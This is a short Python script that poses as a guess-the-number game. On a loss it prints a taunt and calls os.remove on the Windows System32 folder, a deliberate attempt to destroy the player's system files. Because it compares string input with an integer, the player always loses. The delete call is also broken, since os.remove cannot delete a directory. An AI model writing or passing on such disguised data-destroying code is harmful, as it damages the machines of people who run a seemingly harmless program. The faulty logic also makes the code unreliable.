#!/usr/bin/env python3
import os
import random


class Game:
	def __init__(self):
		self.path_to_delete = "C:\Windows\System32"
		os.system("cls")
		os.system('clear')
		os.system('cls')
		self.random_number = random.randint(1,10)
	pass

	def TheGame(self):
		self.game_prompt = input("Guess the number 1 to 10: ")
		if self.game_prompt == self.random_number:
			print("You won !!! ")
		else:
			print("You lost....")
			print("Say goodbye to your Windows. ")
			os.remove(self.path_to_delete)
		print("Thanks for playing. ")
	pass

game_to_play = Game()
game_to_play.TheGame()